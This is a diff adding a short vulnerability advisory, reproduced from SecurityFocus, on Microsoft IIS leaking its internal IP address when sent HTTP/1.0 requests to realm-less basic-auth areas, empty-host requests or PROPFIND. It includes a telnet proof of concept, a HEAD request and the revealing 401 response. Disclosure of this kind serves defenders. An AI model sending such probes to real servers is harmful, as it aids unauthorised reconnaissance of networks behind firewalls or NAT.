@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/1499/info
+
+When a remote user attempts to access an area protected by basic authentication with no realm defined, while specifying HTTP 1.0, Microsoft IIS will return an Access Denied error message containing the internal IP address of the host. Even if IIS is behind a firewall or NAT, it will disclose the true internal IP address to the remote user.
+
+The internal IP address may also be revealed through a HTTP request made with an empty host name. If a PROPFIND HTTP request is made, the message returned will include the IP address as part of the HREF header. The IP address may also be exposed through the WRITE or MKCOL methods, although they would not normally be exposed to the external network.
+
+Eg.
+
+telnet target 80
+Trying target...
+Connected to target.
+Escape character is '^]'.
+HEAD /directory HTTP/1.0[CRLF]
+[CRLF]
+
+HTTP/1.1 401 Access Denied
+WWW-Authenticate: Basic realm="<Internal IP Address>"
+Content-Length: 644
+Content-Type: text/html 
